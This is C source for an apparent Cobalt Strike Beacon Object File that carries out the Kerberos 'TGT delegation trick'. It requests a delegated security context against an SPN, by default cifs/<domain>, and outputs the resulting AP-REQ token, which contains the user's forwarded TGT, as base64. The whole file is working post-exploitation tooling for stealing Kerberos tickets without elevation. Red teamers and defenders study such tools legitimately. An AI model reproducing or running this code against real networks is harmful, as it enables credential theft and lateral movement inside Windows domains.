/*
 * krb_tgtdeleg - Retrieve a usable TGT via Kerberos GSS-API delegation trick
 *
 * Usage: krb_tgtdeleg [/target:SPN]
 *
 * This technique retrieves a usable TGT without requiring elevation
 * by abusing the Kerberos delegation functionality.
 */

/* Include krb5_struct.h first - it includes winsock2.h before windows.h */
#include "include/krb5_struct.h"
#include "include/krb5_utils.h"
#include "beacon.h"

#define SECURITY_WIN32
#include <sspi.h>

static int extract_tgt_from_delegation(const char* target_spn, formatp* output) {
    SECURITY_STATUS ss;
    CredHandle credHandle;
    CtxtHandle ctxHandle;
    TimeStamp expiry;
    SecBufferDesc outDesc;
    SecBuffer outBuf;
    ULONG ctxAttr;
    int result = 0;

    memset(&credHandle, 0, sizeof(credHandle));
    memset(&ctxHandle, 0, sizeof(ctxHandle));

    ss = SECUR32$AcquireCredentialsHandleA(NULL, "Kerberos", SECPKG_CRED_OUTBOUND,
                                            NULL, NULL, NULL, NULL, &credHandle, &expiry);
    if (ss != SEC_E_OK) {
        BeaconFormatPrintf(output, "[-] AcquireCredentialsHandle failed: 0x%08X\n", ss);
        return 0;
    }

    outBuf.cbBuffer = 0;
    outBuf.BufferType = SECBUFFER_TOKEN;
    outBuf.pvBuffer = NULL;
    outDesc.ulVersion = SECBUFFER_VERSION;
    outDesc.cBuffers = 1;
    outDesc.pBuffers = &outBuf;

    /* Request with ISC_REQ_DELEGATE to get a forwarded TGT */
    ss = SECUR32$InitializeSecurityContextA(&credHandle, NULL, (LPSTR)target_spn,
                                             ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_DELEGATE |
                                             ISC_REQ_MUTUAL_AUTH | ISC_REQ_FORWARD_CREDENTIALS,
                                             0, SECURITY_NATIVE_DREP, NULL, 0,
                                             &ctxHandle, &outDesc, &ctxAttr, &expiry);

    if (ss == SEC_E_OK || ss == SEC_I_CONTINUE_NEEDED) {
        if (outBuf.cbBuffer > 0 && outBuf.pvBuffer) {
            BeaconFormatPrintf(output, "[+] Successfully obtained AP-REQ with delegation!\n");
            BeaconFormatPrintf(output, "[*] Response size: %d bytes\n", outBuf.cbBuffer);

            /* The AP-REQ contains the TGT in the authenticator's checksum
             * when delegation is used. We need to extract it. */

            BYTE* token_data = (BYTE*)outBuf.pvBuffer;
            size_t token_len = outBuf.cbBuffer;

            if (ctxAttr & ISC_RET_DELEGATE) {
                BeaconFormatPrintf(output, "[+] Delegation flag confirmed!\n\n");

                /* The delegated TGT is typically in KRB-CRED format within the token
                 * For simplicity, output the entire token */
                size_t b64_len = ((token_len + 2) / 3) * 4 + 1;
                char* b64 = (char*)malloc(b64_len);
                if (b64) {
                    base64_encode(token_data, token_len, b64);
                    BeaconFormatPrintf(output, "[*] Token contains delegated TGT\n");
                    BeaconFormatPrintf(output, "[*] Base64 encoded token:\n\n%s\n\n", b64);
                    BeaconFormatPrintf(output, "[*] Note: Extract KRB-CRED from token for the TGT\n");
                    free(b64);
                    result = 1;
                }
            } else {
                BeaconFormatPrintf(output, "[-] Delegation was not performed\n");
                BeaconFormatPrintf(output, "[*] Target SPN may not be configured for delegation\n");

                size_t b64_len = ((token_len + 2) / 3) * 4 + 1;
                char* b64 = (char*)malloc(b64_len);
                if (b64) {
                    base64_encode(token_data, token_len, b64);
                    BeaconFormatPrintf(output, "\n[*] AP-REQ token (without TGT):\n%s\n", b64);
                    free(b64);
                }
            }

            SECUR32$FreeContextBuffer(outBuf.pvBuffer);
        }
        SECUR32$DeleteSecurityContext(&ctxHandle);
    } else {
        BeaconFormatPrintf(output, "[-] InitializeSecurityContext failed: 0x%08X\n", ss);
        if (ss == SEC_E_TARGET_UNKNOWN) {
            BeaconFormatPrintf(output, "[-] Target SPN not found\n");
        }
    }

    SECUR32$FreeCredentialsHandle(&credHandle);
    return result;
}

void go(char* args, int alen) {
    formatp output;
    ARG_PARSER parser;

    BeaconFormatAlloc(&output, 32 * 1024);
    arg_init(&parser, args, alen);

    char* target = arg_get(&parser, "target");

    BeaconFormatPrintf(&output, "[*] Action: TGT Delegation Trick\n");

    const char* spn;
    if (target) {
        spn = target;
        BeaconFormatPrintf(&output, "[*] Using specified target: %s\n", spn);
    } else {
        char* domain = get_domain_from_env();
        if (domain) {
            static char default_spn[256];
            sprintf(default_spn, "cifs/%s", domain);
            spn = default_spn;
            BeaconFormatPrintf(&output, "[*] Using default target: %s\n", spn);
            free(domain);
        } else {
            BeaconPrintf(CALLBACK_ERROR, "Could not determine domain. Please specify /target:SPN");
            BeaconFormatFree(&output);
            return;
        }
    }

    BeaconFormatPrintf(&output, "\n[*] Attempting to retrieve TGT via delegation...\n\n");

    extract_tgt_from_delegation(spn, &output);

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));

    BeaconFormatFree(&output);
    if (target) free(target);
}
